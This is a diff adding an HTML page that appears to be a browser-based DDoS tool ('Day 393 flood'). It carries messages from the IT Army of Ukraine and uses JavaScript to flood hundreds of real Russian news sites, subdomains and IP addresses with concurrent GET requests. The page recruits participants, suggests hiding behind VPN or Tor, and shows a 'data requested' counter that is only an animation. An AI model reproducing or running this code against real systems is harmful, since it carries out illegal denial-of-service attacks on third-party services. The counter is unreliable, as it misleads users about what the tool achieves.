@@ -1,0 +1,797 @@
+<!doctype html><head>
+<html lang="en">
+<meta charset="utf-8">
+<meta name="viewport" content="width=1024">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Day 393 flood</title>
+<link href="https://www.helpukr.xyz/bootstrap.helpukr.css" rel="stylesheet" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" crossorigin="anonymous"></script>
+<script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+</head>
+
+
+<style>
+/* width */
+::-webkit-scrollbar {
+  width: 10px;
+  overflow: auto;
+  height: 0em;
+}
+/* Track */
+::-webkit-scrollbar-track {
+  background: #34a8eb;
+}
+/* Handle */
+::-webkit-scrollbar-thumb {
+  background: #63c6ff
+  ;
+}
+/* Handle on hover */
+::-webkit-scrollbar-thumb:hover {
+  background: yellow;
+}
+.style10 {
+	font-size: 9px;
+	color: #FFFFFF;
+}
+</style>
+	<script> 
+		/* This method uses ipify's api to get the clients IP Address. 
+		This method is completely free and no limitations of use. */ 
+		$.getJSON("https://api.ipify.org?format=json", 
+										function(data) { 
+			// userip element is where the IP will be displayed
+			$("#userip").html(data.ip); 
+		}) 
+	</script>
+	<style> 
+		h6 {
+		color:white;
+		}
+	</style>
+    <style>
+        body {
+            padding: 0;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #FFD600;
+        }
+        .title {
+            margin: 3rem auto 3rem auto;
+            text-align: center;
+            color: #005BBC;
+        }
+        .intro .howto {
+            background-color: #005BBC;
+        }
+        .intro .howto h3 {
+            color: #FFD600;
+            text-align: center;
+            margin-top: 1rem;
+        }
+        .intro .howto p {
+            color: white;
+            text-align: justify;
+        }
+
+        .footer {
+    color: #005BBC;
+    margin-top: 2rem;
+    text-align: center;
+        }
+        .desc{
+            color:black;
+            padding-top: 2rem;
+            padding-bottom: 2rem;
+            margin: 0 auto;
+            width: 60%;
+        }
+        .desc h3 {
+            text-align: center;
+            color: #005BBC;
+        }
+        #stats h4 {
+            font-size: 1.1em;
+            text-decoration: underline;
+            color: #005BBC;
+            font-weight: 400;
+        }
+        table.status {
+            margin-bottom: 10px;
+        }
+    .style1 {
+	color: #CC0000;
+	font-weight: bold;
+}
+.style6 {color: #FF6262}
+    .style7 {font-size: 0.1px}
+    .style9 {
+	color: #FFD600;
+	font-weight: bold;
+	font-size: 18px;
+}
+    .style10 {font-size: 24px}
+    .style11 {
+	font-size: 16px;
+	color: #FFFFFF;
+} 
+    .style13 {
+	margin: 3rem auto 3rem auto;
+	text-align: center;
+	color: #FFD600;
+	font-size: 24px;
+	font-weight: bold;
+}
+    .style14 {color: #FFFFFF}
+    .style15 {color: #FFFF00}
+    .style16 {color: #FF3300}
+    .style17 {color: #FF6633}
+.style21 {color: #B9DCFF}
+    .style22 {color: #ECE3AA}
+	table {
+  border-color: #fffd9c;
+}
+</style>
+<body>
+    <div class="modal" id="HelpUKR-WarningBox" tabindex="-1" role="dialog" aria-labelledby="HelpUKR-WarningBoxLabel" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+    <div class="modal-content">
+    <div class="modal-header" style=" padding-bottom: 4px; padding-top: 3px;padding-left: 3px;">
+    <h5 id="HelpUKR-WarningBoxLabel" style=" margin-bottom: 0px;">
+	<span class="modal-title style1"><img class="qIBnUc" src="https://i.imgur.com/hwWmsDc.png" draggable="false" width="50px" alt="UKR"> Warning: </span><span class="modal-title style6">Read before you continue.&nbsp;<span class="style16"><i>[</span><span class="style17"><b>Day 393</span></b><span class="style16">]</i></span></span></h5></div>
+    <div class="modal-body" style=" padding-top: 5px; padding-bottom: 0px;">
+    <p style=" margin-bottom: 0px;">As you’ll already be aware, DDoSin or participating in any kind of cyber-attack in general is illegal, and usually for good reason.</p>
+<hr style=" margin-top: 3px; margin-bottom: 3px;">
+    <p style=" margin-bottom: 0px;">Click "Continue" if you have a VPN, Proxy, the Tor browser or  your own secure connection &amp; wish to support Ukraine in taking down Russian propaganda and services aiding Putins invasion</p>
+<hr style=" margin-top: 3px; margin-bottom: 3px;">
+		This works by sending GET requests to each targeted website. It’s like opening each website in a random sequence on your PC and re-requesting the data over and over, although the data is not saved or cached, Due to the way it work, It should be fair to say that your Internet service Provider (ISP) won’t be any more bothered about this than they would you browsing the internet, but its always best to stay safe when it comes to security.                                                                                                                                                                                                                                                           
+<hr style=" margin-top: 3px; margin-bottom: 3px;">
+    <p><span style="font-size:14px;"><u></u><strong>Message from the IT Army of Ukraine regarding Todays targets: </strong></span>&nbsp;<br>
+  &nbsp; &nbsp; &nbsp; Over the weekend, the banking system outage spread to the<br>
+  &nbsp; &nbsp; &nbsp; "Russia" Bank . Symbolically, after a series of regional<br>
+  &nbsp; &nbsp; &nbsp; names we targeted "Rasia", right? And we also added<br>
+  &nbsp; &nbsp; &nbsp; some information hygiene by blocking a bunch of garbage<br>
+  &nbsp; &nbsp; &nbsp; news sites. The weekend turned out well.
+<span style="font-size:14px;"><u></u><strong><br>
+		Additional message for newly added targets:<em>&nbsp;</em>&nbsp;<br></strong>
+  &nbsp; &nbsp; &nbsp; Join the team of IT Army volunteers through <a href="https://forms.gle/BBhy8UwkjfqrfFi78" target="_blank">the form.</a><br>
+  &nbsp; &nbsp; &nbsp; Stand in the ranks of cyber-assault troops.<br>
+    </div>
+    <div class="modal-footer">
+    <button type="button" class="btn btn-secondary" onClick="window.location.href='https://www.helpukr.xyz'">Leave</button>
+    <button type="button" class="btn btn-primary" data-dismiss="HelpUKR-WarningBoxLabel" onClick="togglePause(); myModal.toggle();">Continue</button></div></div></div></div>
+    <table width="100%" border="0" align="center" bgcolor="#005BBC">
+      <tr>
+        <td bgcolor="#004A9D"><div align="center">
+          <table width="200" border="1" style="border-top-width: 0px;">
+              <tbody><tr>
+                <td><table width="989" border="1" align="left" style="border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-right-width: 0px;">
+                  <tbody>
+                    <tr>
+                      <td width="239" bgcolor="#005BB7"><div align="right"><span class="style14"><strong> Info:</strong> Your Public IP Address is: </span></div></td>
+                      <td width="175" bgcolor="#005BB7"><h6 id="userip" style="margin-bottom: 0px;">Loading..</h6></td>
+                      <td width="553" bgcolor="#005BB7"><div align="right"><span class="style21">For privacy, download the Tor Browser:</span> <a href="https://www.torproject.org/download/" target="_blank" class="style22" rel="nofollow">https://www.torproject.org/download/</a> &nbsp; </div></td>
+                    </tr>
+                  </tbody>
+                </table></td>
+              </tr>
+            </tbody></table>
+          <p class="style13" style="margin-top: 0px;margin-bottom: 0px;">Propaganda http(s) flood for <span class="style15">Day 393 </span>using targets from the IT Army of Ukraine.</p>
+        </div></td>
+      </tr><tr>
+        <td bgcolor="#0057B7"><div align="center" class="style9 style10">
+          <h3><u>Information about this tool.</u></h3>
+        </div></td>
+      </tr><tr>
+        <td><table width="90%" border="0" align="center">
+          <tr>
+            <td align="center"><p class="style11">This tool is hosted via <a href="https://pages.github.com/" target="_blank" class="align-content-sm-between">GitHub Page</a>, You can download it for local use and customization <a href="https://raw.githubusercontent.com/helpukr/helpukr.github.io/main/day393.htm" target="_blank" class="style15">here</a>. A new page will be added for each day, with a new set of targets from the Ukrainian IT Army's telegram servers.</p>
+              <p class="style11">All of the news in the Russian federation is fake and need to be shut down, we need as many people as possible to help. Just a tiny 1kbps of data could be the edge needed to take down a server hosting propaganda.<br>
+                <br>Just open this page and leave it running on your devices as long as possible, it will flood targets selected specifically for that day.<br>
+                Targets are chosen by an intelligence team who are always looking at what services are aiding Russia’s war,together we can pose a huge load on their infrastructure.</p>
+          <details>
+			  <summary><span style="color: #ffff99;">Click Here for <b>FAQ</b> <i>(Questions & Answers)</i></span></summary>
+              <p><table width="100%" border="0">
+                <tbody><tr>   
+                  <td><hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"><p class="style11">FAQ:<br>
+                    <span style="color: #ffff99;"><strong>Q)</strong></span> How can I use this in the tor browser if HTTPS overrides HTTP no matter what i try?<br>
+                    <span style="color: #ffff99;"><strong>A)</strong></span> <em>Download the page for local use, it won't use any http/https protocols because those are used to request files from a web server, but using it locally (directly from your computer) bypasses the need and allows you to flood both HTTP and HTTPS from your TOR Browser's IP.</em></p>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> How can I see what's happening in more detail?<br>
+                    <span style="color: #ffff99;"><strong>A)</strong></span> Redacted for security.</p>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> After so much time has passed, my browser/computer become very laggy and unresponsive or my browser crashes, how can I fix this?<br>
+                    <span style="color: #ffff99;"><strong>A)</strong></span> Redacted for security.</p>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> Why are some of the requests having the same number error after a while?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> This is likely caused by the IP of the VPN you're using has been blocked on their side, but it could also mean the site's just totally overloaded and cannot respond to any requests.<br>Also if you’re are using https:// in the address bar that would cause the http:// addresses to do the same</p></td>
+                    </tr>
+                </tbody>
+            </table></p>
+          </details>
+            <hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"></td>
+          </tr>
+        </table>
+          <table width="613" border="0" align="center">
+            <tr>
+              <td width="607"><h3 align="center" class="style14">Session Status</h3>
+                <p align="center" class="style14" style=" margin-bottom: 0px; padding-bottom: 2px;">Below is a log of sites that ether responded with errors or failed to respond at all.<br>
+                  It’s normal for this number to count up slow or fast and can often change.<br>
+                  If a lot of services are overloaded the numbers will go fast, else they’ll go slower.<br>
+                  If all requests are the same as all errors on some sites, it most likely means that the<br>
+                  site operator has banned the IP you’re using.</p>
+              </td>
+            </tr>
+          </table>
+	    </td>
+      </tr>
+    </table>
+<div class="desc text-center" style=" padding-top: 4px;">
+  <p align="center" class="style7" style=" margin-bottom: 0px;">Total number of requests: <span id="totalrequests">0</span></p>
+  <p>So far <span id="totalerrors"><em>zero</em></span> sites have responded with errors</p>
+<button type="button" class="btn btn-primary" onClick="togglePause();" style=" padding-left: 32px; padding-right: 32px; padding-top: 8px; padding-bottom: 8px;">Resume</button></div>
+<div id="stats" class="container">
+  <div class="row">
+  </div>
+</div>
+<p class="footer">This website is an easy to run solution to flooding Russian propaganda via any internet capable device with a browser.<br>
+      For example you can walk around town shopping and flood Russian propaganda from a phone in your pocket.<br>
+      It can even be used via the browser app on a Smart TV in the background whilst you watch TV.<br>
+      With your help you can convince a Russian to rebel agents the war by making them<br>
+      look elsewhere for news, remember, Nothing you do is too little!<br>
+      Glory to Ukraine, Glory to the hero’s.<br><br>
+	  <center>
+	    <div id="betabox" style="text-align: center"><span class="footer"><strong><span style="color:#3E7EFF"><em><u>Beta</u>:</em></span></strong> Estimated data requested from servers via GET: <span class="number-counter" data-count-from="0" data-count-to="1000000000000" data-count-speed="0.02">0</span>MB (MegaBytes)</span></div></center>
+<style>#betabox {
+  padding: 1px ;
+  border-top: 1px solid #3498db;
+  border-right: 1px solid #3498db;
+  background-color: #FFE248;
+  line-height: 110%;
+  border-left: 1px solid #3498db;
+  align-content: center;
+  align-self: 4px ;
+  width: 570px ;
+}</style>
+<script>
+        // target list
+        var urls = [
+        //Over the weekend, the banking system outage spread to the "Russia" Bank . Symbolically, after a series of regional names we targeted "Rasia", right? And we also added some information hygiene by blocking a bunch of garbage news sites. The weekend turned out well.
+        //cont.ws Targets
+		    'http://jasper-0.cont.ws',
+		    'http://inforab.00.cont.ws',
+		    'http://stix0000.cont.ws',
+		    'http://wtf1000.cont.ws',
+		    'http://zrk1000.cont.ws',
+		    'http://vn1000.cont.ws',
+		    'http://figaro1000.cont.ws',
+		    'http://andreww1000.cont.ws',
+		    'http://25062000.cont.ws',
+		    'http://dasha2000.cont.ws',
+		    'http://smakdak2000.cont.ws',
+		    'http://finval2000.cont.ws',
+		    'http://fendel2000.cont.ws',
+		    'http://tvm2000.cont.ws',
+		    'http://euler2000.cont.ws',
+		    'http://vopros2000.cont.ws',
+		    'http://kit2000.cont.ws',
+		    'http://ussr3000.cont.ws',
+		    'http://severodvinsk4000.cont.ws',
+		    'http://rul5000.cont.ws',
+		    'http://mercedes5000.cont.ws',
+		    'http://solarrain000.cont.ws',
+		    'http://konst000.cont.ws',
+		    'http://ss69100.cont.ws',
+		    'http://darya100.cont.ws',
+		    'http://anivaded100.cont.ws',
+		    'http://sd100.cont.ws',
+		    'http://voin100.cont.ws',
+		    'http://saturn100.cont.ws',
+		    'http://kasper100.cont.ws',
+		    'http://fedor100.cont.ws',
+		    'http://markov100.cont.ws',
+		    'http://july100.cont.ws',
+		    'http://g00200.cont.ws',
+		    'http://sya7200.cont.ws',
+		    'http://svetik200.cont.ws',
+		    'http://skyblu200.cont.ws',
+		    'http://id83336300.cont.ws',
+		    'http://sales400.cont.ws',
+		    'http://vv-500.cont.ws',
+		    'http://skif100500.cont.ws',
+		    'http://abdysch100500.cont.ws',
+		    'http://23500.cont.ws',
+		    'http://id163085500.cont.ws',
+		    'http://zoolone500.cont.ws',
+		    'http://woaland700.cont.ws',
+		    'http://sonerikw700.cont.ws',
+		    'http://mir1900.cont.ws',
+		    'http://s5900.cont.ws',
+		    'http://oleg00.cont.ws',
+		    'http://loki00.cont.ws',
+		    'http://spawn00.cont.ws',
+		    'http://dnepro00.cont.ws',
+		    'http://privet00.cont.ws',
+		    'http://0000010.cont.ws',
+		    'http://01010.cont.ws',
+		    'http://vadim1010.cont.ws',
+		    'http://19032010.cont.ws',
+		    'http://aliska2010.cont.ws',
+		    'http://svetlana2010.cont.ws',
+		    'http://eugene2010.cont.ws',
+		    'http://true2010.cont.ws',
+		    'http://otshelnik2010.cont.ws',
+		    'http://haron2010.cont.ws',
+		    'http://zaurus2010.cont.ws',
+		    'http://m.belozerov2010.cont.ws',
+		    'http://id57714010.cont.ws',
+		    'http://id340686010.cont.ws',
+		    'http://o17918010.cont.ws',
+		    'http://aviator9010.cont.ws',
+		    'http://solaris2110.cont.ws',
+		    'http://id310241210.cont.ws',
+		    'http://alex581210.cont.ws',
+		    'http://mila2210.cont.ws',
+		    'http://id359426210.cont.ws',
+		    'http://id323836210.cont.ws',
+		    'http://tank19610.cont.ws',
+		    'http://revkom0710.cont.ws',
+		    'http://lilia0910.cont.ws',
+		    'http://anna9910.cont.ws',
+		    'http://30flyka10.cont.ws',
+		    'http://terra10.cont.ws',
+		    'http://alexc10.cont.ws',
+		    'http://trotil10.cont.ws',
+		    'http://01bogomol10.cont.ws',
+		    'http://alsndr10.cont.ws',
+		    'http://tet10.cont.ws',
+		    'http://makarov10.cont.ws',
+		    'http://seagull-2020.cont.ws',
+		    'http://selena2020.cont.ws',
+		    'http://mera2020.cont.ws',
+		    'http://bapkon2020.cont.ws',
+		    'http://veleslav2020.cont.ws',
+		    'http://id178083020.cont.ws',
+		    'http://vini120.cont.ws',
+		    'http://margo1320.cont.ws',
+		    'http://79628567320.cont.ws',
+		    'http://id527221520.cont.ws',
+		    'http://kuzya1520.cont.ws',
+		    'http://id311693520.cont.ws',
+		    'https://jasper-0.cont.ws',
+		    'https://inforab.00.cont.ws',
+		    'https://stix0000.cont.ws',
+		    'https://wtf1000.cont.ws',
+		    'https://zrk1000.cont.ws',
+		    'https://vn1000.cont.ws',
+		    'https://figaro1000.cont.ws',
+		    'https://andreww1000.cont.ws',
+		    'https://25062000.cont.ws',
+		    'https://dasha2000.cont.ws',
+		    'https://smakdak2000.cont.ws',
+		    'https://finval2000.cont.ws',
+		    'https://fendel2000.cont.ws',
+		    'https://tvm2000.cont.ws',
+		    'https://euler2000.cont.ws',
+		    'https://vopros2000.cont.ws',
+		    'https://kit2000.cont.ws',
+		    'https://ussr3000.cont.ws',
+		    'https://severodvinsk4000.cont.ws',
+		    'https://rul5000.cont.ws',
+		    'https://mercedes5000.cont.ws',
+		    'https://solarrain000.cont.ws',
+		    'https://konst000.cont.ws',
+		    'https://ss69100.cont.ws',
+		    'https://darya100.cont.ws',
+		    'https://anivaded100.cont.ws',
+		    'https://sd100.cont.ws',
+		    'https://voin100.cont.ws',
+		    'https://saturn100.cont.ws',
+		    'https://kasper100.cont.ws',
+		    'https://fedor100.cont.ws',
+		    'https://markov100.cont.ws',
+		    'https://july100.cont.ws',
+		    'https://g00200.cont.ws',
+		    'https://sya7200.cont.ws',
+		    'https://svetik200.cont.ws',
+		    'https://skyblu200.cont.ws',
+		    'https://id83336300.cont.ws',
+		    'https://sales400.cont.ws',
+		    'https://vv-500.cont.ws',
+		    'https://skif100500.cont.ws',
+		    'https://abdysch100500.cont.ws',
+		    'https://23500.cont.ws',
+		    'https://id163085500.cont.ws',
+		    'https://zoolone500.cont.ws',
+		    'https://woaland700.cont.ws',
+		    'https://sonerikw700.cont.ws',
+		    'https://mir1900.cont.ws',
+		    'https://s5900.cont.ws',
+		    'https://oleg00.cont.ws',
+		    'https://loki00.cont.ws',
+		    'https://spawn00.cont.ws',
+		    'https://dnepro00.cont.ws',
+		    'https://privet00.cont.ws',
+		    'https://0000010.cont.ws',
+		    'https://01010.cont.ws',
+		    'https://vadim1010.cont.ws',
+		    'https://19032010.cont.ws',
+		    'https://aliska2010.cont.ws',
+		    'https://svetlana2010.cont.ws',
+		    'https://eugene2010.cont.ws',
+		    'https://true2010.cont.ws',
+		    'https://otshelnik2010.cont.ws',
+		    'https://haron2010.cont.ws',
+		    'https://zaurus2010.cont.ws',
+		    'https://m.belozerov2010.cont.ws',
+		    'https://id57714010.cont.ws',
+		    'https://id340686010.cont.ws',
+		    'https://o17918010.cont.ws',
+		    'https://aviator9010.cont.ws',
+		    'https://solaris2110.cont.ws',
+		    'https://id310241210.cont.ws',
+		    'https://alex581210.cont.ws',
+		    'https://mila2210.cont.ws',
+		    'https://id359426210.cont.ws',
+		    'https://id323836210.cont.ws',
+		    'https://tank19610.cont.ws',
+		    'https://revkom0710.cont.ws',
+		    'https://lilia0910.cont.ws',
+		    'https://anna9910.cont.ws',
+		    'https://30flyka10.cont.ws',
+		    'https://terra10.cont.ws',
+		    'https://alexc10.cont.ws',
+		    'https://trotil10.cont.ws',
+		    'https://01bogomol10.cont.ws',
+		    'https://alsndr10.cont.ws',
+		    'https://tet10.cont.ws',
+		    'https://makarov10.cont.ws',
+		    'https://seagull-2020.cont.ws',
+		    'https://selena2020.cont.ws',
+		    'https://mera2020.cont.ws',
+		    'https://bapkon2020.cont.ws',
+		    'https://veleslav2020.cont.ws',
+		    'https://id178083020.cont.ws',
+		    'https://vini120.cont.ws',
+		    'https://margo1320.cont.ws',
+		    'https://79628567320.cont.ws',
+		    'https://id527221520.cont.ws',
+		    'https://kuzya1520.cont.ws',
+		    'https://id311693520.cont.ws',
+        //svpressa.ru Targets
+		    'http://svpressa.ru',
+		    'http://mail1.svpressa.ru',
+		    'http://mail.svpressa.ru',
+		    'http://www.svpressa.ru',
+		    'http://88.212.231.252',
+		    'http://95.46.1.34',
+		    'http://82.204.162.10',
+		    'http://88.212.231.252',
+		    'https://svpressa.ru',
+		    'https://mail1.svpressa.ru',
+		    'https://mail.svpressa.ru',
+		    'https://www.svpressa.ru',
+		    'https://88.212.231.252',
+		    'https://95.46.1.34',
+		    'https://82.204.162.10',
+		    'https://88.212.231.252',
+        //vz.ru Targets
+		    'http://vz.ru',
+		    'http://www3.vz.ru',
+		    'http://img.health.vz.ru',
+		    'http://front-01.vz.ru',
+		    'http://adv.vz.ru',
+		    'http://admin2.vz.ru',
+		    'http://img.vz.ru',
+		    'http://img.realty.vz.ru',
+		    'http://history.vz.ru',
+		    'http://realty.vz.ru',
+		    'http://admin.vz.ru',
+		    'http://journal.vz.ru',
+		    'http://txt.adv.vz.ru',
+		    'http://photo.vz.ru',
+		    'http://5.188.136.117',
+		    'http://217.16.28.217',
+		    'http://193.106.92.239',
+		    'http://31.184.219.73',
+		    'http://185.151.243.7',
+		    'http://193.106.92.239',
+		    'http://87.242.82.76',
+		    'http://217.16.28.218',
+		    'https://vz.ru',
+		    'https://www3.vz.ru',
+		    'https://img.health.vz.ru',
+		    'https://front-01.vz.ru',
+		    'https://adv.vz.ru',
+		    'https://admin2.vz.ru',
+		    'https://img.vz.ru',
+		    'https://img.realty.vz.ru',
+		    'https://history.vz.ru',
+		    'https://realty.vz.ru',
+		    'https://admin.vz.ru',
+		    'https://journal.vz.ru',
+		    'https://txt.adv.vz.ru',
+		    'https://photo.vz.ru',
+		    'https://5.188.136.117',
+		    'https://217.16.28.217',
+		    'https://193.106.92.239',
+		    'https://31.184.219.73',
+		    'https://185.151.243.7',
+		    'https://193.106.92.239',
+		    'https://87.242.82.76',
+		    'https://217.16.28.218',
+        //m24.ru Targets
+		    'http://m24.ru',
+		    'http://cross.m24.ru',
+		    'http://guide.m24.ru',
+		    'http://social.m24.ru',
+		    'http://media.m24.ru',
+		    'http://tv.m24.ru',
+		    'http://poekhali.m24.ru',
+		    'http://tvm.m24.ru',
+		    'http://news.m24.ru',
+		    'http://mechta.m24.ru',
+		    'http://assist.m24.ru',
+		    'http://online.m24.ru',
+		    'http://dev.thecity.m24.ru',
+		    'http://opolchenie.m24.ru',
+		    'http://stopvirus.m24.ru',
+		    'http://cbot.m24.ru',
+		    'http://night.m24.ru',
+		    'http://b2.m24.ru',
+		    'http://prodvkadre.m24.ru',
+		    'http://gid.m24.ru',
+		    'http://digital.m24.ru',
+		    'http://siteed.m24.ru',
+		    'http://newsfeed.m24.ru',
+		    'http://pravila.m24.ru',
+		    'http://image2.m24.ru',
+		    'http://simach.m24.ru',
+		    'http://promo.m24.ru',
+		    'http://showroom.m24.ru',
+		    'http://staff.m24.ru',
+		    'http://urbanforum.m24.ru',
+		    'http://DARIM.m24.ru',
+		    'http://go.m24.ru',
+		    'http://b3.m24.ru',
+		    'http://www.gid.m24.ru',
+		    'http://old2.m24.ru',
+		    'http://2019.m24.ru',
+		    'http://dev.m24.ru',
+		    'http://m.m24.ru',
+		    'http://b1.tv.m24.ru',
+		    'http://redmine.m24.ru',
+		    'http://9may.m24.ru',
+		    'http://s.m24.ru',
+		    'http://www.m24.ru',
+		    'http://devlectory.m24.ru',
+		    'http://bot.m24.ru',
+		    'http://dev2.m24.ru',
+		    'http://b1.m24.ru',
+		    'http://uploadapi.m24.ru',
+		    'http://crossx.m24.ru',
+		    'http://m1.m24.ru',
+		    'http://marathongifts.m24.ru',
+		    'http://b1.night.m24.ru',
+		    'http://lectory.m24.ru',
+		    'http://thecity.m24.ru',
+		    'http://pravda.m24.ru',
+		    'http://program.m24.ru',
+		    'http://darim.m24.ru',
+		    'http://ny23.m24.ru',
+		    'http://old.m24.ru',
+		    'http://puls.m24.ru',
+		    'http://tele.m24.ru',
+		    'http://quiz.m24.ru',
+		    'http://l.m24.ru',
+		    'http://test.m24.ru',
+		    'http://large.m24.ru',
+		    'http://n.m24.ru',
+		    'http://adv.m24.ru',
+		    'http://ruby.m24.ru',
+		    'https://m24.ru',
+		    'https://cross.m24.ru',
+		    'https://guide.m24.ru',
+		    'https://social.m24.ru',
+		    'https://media.m24.ru',
+		    'https://tv.m24.ru',
+		    'https://poekhali.m24.ru',
+		    'https://tvm.m24.ru',
+		    'https://news.m24.ru',
+		    'https://mechta.m24.ru',
+		    'https://assist.m24.ru',
+		    'https://online.m24.ru',
+		    'https://dev.thecity.m24.ru',
+		    'https://opolchenie.m24.ru',
+		    'https://stopvirus.m24.ru',
+		    'https://cbot.m24.ru',
+		    'https://night.m24.ru',
+		    'https://b2.m24.ru',
+		    'https://prodvkadre.m24.ru',
+		    'https://gid.m24.ru',
+		    'https://digital.m24.ru',
+		    'https://siteed.m24.ru',
+		    'https://newsfeed.m24.ru',
+		    'https://pravila.m24.ru',
+		    'https://image2.m24.ru',
+		    'https://simach.m24.ru',
+		    'https://promo.m24.ru',
+		    'https://showroom.m24.ru',
+		    'https://staff.m24.ru',
+		    'https://urbanforum.m24.ru',
+		    'https://DARIM.m24.ru',
+		    'https://go.m24.ru',
+		    'https://b3.m24.ru',
+		    'https://www.gid.m24.ru',
+		    'https://old2.m24.ru',
+		    'https://2019.m24.ru',
+		    'https://dev.m24.ru',
+		    'https://m.m24.ru',
+		    'https://b1.tv.m24.ru',
+		    'https://redmine.m24.ru',
+		    'https://9may.m24.ru',
+		    'https://s.m24.ru',
+		    'https://www.m24.ru',
+		    'https://devlectory.m24.ru',
+		    'https://bot.m24.ru',
+		    'https://dev2.m24.ru',
+		    'https://b1.m24.ru',
+		    'https://uploadapi.m24.ru',
+		    'https://crossx.m24.ru',
+		    'https://m1.m24.ru',
+		    'https://marathongifts.m24.ru',
+		    'https://b1.night.m24.ru',
+		    'https://lectory.m24.ru',
+		    'https://thecity.m24.ru',
+		    'https://pravda.m24.ru',
+		    'https://program.m24.ru',
+		    'https://darim.m24.ru',
+		    'https://ny23.m24.ru',
+		    'https://old.m24.ru',
+		    'https://puls.m24.ru',
+		    'https://tele.m24.ru',
+		    'https://quiz.m24.ru',
+		    'https://l.m24.ru',
+		    'https://test.m24.ru',
+		    'https://large.m24.ru',
+		    'https://n.m24.ru',
+		    'https://adv.m24.ru',
+		    'https://ruby.m24.ru',
+        ];
+        // initialize variables
+        var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
+        var statRow = document.querySelector("#stats > .row");
+        var myModal = new bootstrap.Modal(document.getElementById('HelpUKR-WarningBox'), {});
+        var CONCURRENCY_LIMIT = 200;
+        var queue = [];
+        var attack = false;
+        var totalrequests = 0;
+        var totalerrors = 0;
+        function togglePause () {
+            if (attack) {
+                attack = false;
+                document.querySelector("div.desc .btn").innerText = "Resume";
+            } else {
+                attack = true;
+                document.querySelector("div.desc .btn").innerText = "Pause";
+                for (var i=0; i<urls.length; i++) {
+                    flood(i);
+                }
+            }
+        }
+        async function fetchWithTimeout(resource, options) {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), options.timeout);
+            return fetch(resource, {
+                signal: controller.signal,
+                mode: 'no-cors'
+            }).then((response) => {
+                clearTimeout(id);
+                return response;
+            }).catch((error) => {
+                clearTimeout(id);
+                throw error;
+            });
+        }
+        async function sleep(ms) {
+            return new Promise(r => setTimeout(r, ms));
+        }         
+        async function flood(n) {
+            const url = urls[n];
+            const target = targets[url];
+            while (attack) {
+                if (queue.length > CONCURRENCY_LIMIT) {
+                    await queue.shift();
+                }
+                queue.push(
+                    fetchWithTimeout(url, { timeout: 2000 })
+                        .catch((error) => {
+                            if (error.code === 20 /* ABORT */) {
+                                return;
+                            }
+                            target.number_of_errored_responses++;
+                            target.error_message = error.message;
+                            totalerrors++;
+                        })
+                        .then((response) => {
+                            if (response && !response.ok) {
+                                target.number_of_errored_responses++;
+                                target.error_message = response.statusText;
+                                totalerrors++;
+                            }
+                            target.number_of_requests++;
+                        })
+                        .finally(() => updateTargetDisplay(n))
+                );
+                await sleep(1);
+            }
+        }
+        // Update data for target n
+        function updateTargetDisplay(n) {
+            var url = urls[n];
+            var {number_of_requests, number_of_errored_responses} = targets[url];
+            var requests_cell = document.querySelector(`#target${n} .requests`);
+            var errors_cell = document.querySelector(`#target${n} .errors`);
+            requests_cell.innerText = number_of_requests;
+            errors_cell.innerText = number_of_errored_responses;
+            document.querySelector("#totalrequests").innerText = totalrequests;
+            document.querySelector("#totalerrors").innerText = totalerrors;
+        }
+        // Shuffle array order before starting
+        for (let i = urls.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [urls[i], urls[j]] = [urls[j], urls[i]];
+        }
+        // Create div for each target
+        for (var i=0; i<urls.length; i++) {
+            statRow.innerHTML += `
+                <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
+                  <h7>${"<u><i>Hidden Target:</i></u>"}</h7>
+                    <table class='status'>
+                      <tr><td>requests:</td><td class="requests">0</td></tr>
+                      </tr><td>errors:</td><td class="errors">0</td></tr>
+                    </table>
+                  </div>
+            `;
+        }
+        // Show warning window
+        myModal.toggle();
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-85513613-1');
+</script>
+<script>
+// BETA plugin for estimated requested data
+(function($) {
+  $.fn.countTo = function(options) {
+    return this.each(function() {
+      //-- Arrange
+      var FRAME_RATE = 60; // Predefine default frame rate to be 60fps
+      var $el = $(this);
+      var countFrom = parseInt($el.attr('data-count-from'));
+      var countTo = parseInt($el.attr('data-count-to'));
+      var countSpeed = $el.attr('data-count-speed'); // Number increment per second
+
+      //-- Action
+      var rafId;
+      var increment;
+      var currentCount = countFrom;
+      var countAction = function() {              // Self looping local function via requestAnimationFrame
+        if(currentCount < countTo) {              // Perform number incremeant
+          $el.text(Math.floor(currentCount));     // Update HTML display
+          increment = countSpeed / FRAME_RATE;    // Calculate increment step
+          currentCount += increment;              // Increment counter
+          rafId = requestAnimationFrame(countAction);
+        } else {                                  // Terminate animation once it reaches the target count number
+          $el.text(countTo);                      // Set to the final value before everything stops
+          //cancelAnimationFrame(rafId);
+        }
+      };
+      rafId = requestAnimationFrame(countAction); // Initiates the looping function
+    });
+  };
+}(jQuery));
+
+//-- Executing
+$('.number-counter').countTo();
+</script>
+</html>
